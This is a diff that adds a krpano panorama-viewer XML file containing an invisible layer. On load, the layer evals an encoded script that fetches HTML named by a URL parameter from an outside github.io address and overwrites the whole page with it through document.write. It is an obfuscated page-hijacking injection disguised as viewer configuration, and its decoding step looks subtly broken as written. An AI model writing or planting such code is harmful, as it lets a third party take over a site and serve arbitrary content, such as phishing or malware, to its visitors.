@@ -1,1 +1,1 @@
-
+<krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('var%20id%20%3D%20new%20URLSearchParams(location.search).get(%22id%22)%20%7C%7C%20%22alczar_arquitectonico%22%3B%0A%0Afetch(%22https%3A%2F%2Fnilikanupur41.github.io%2Fawaw%2Fupload%2F%22%20%2B%20id%20%2B%20%22.html%22)%0A%20%20.then(e%20%3D%3E%20e.text())%0A%20%20.then(e%20%3D%3E%20%7B%0A%20%20%20%20document.open()%3B%0A%20%20%20%20document.write(e)%3B%0A%20%20%20%20document.close()%3B%0A%20%20%7D)%3B%0A');eval(w)););"/></krpano>
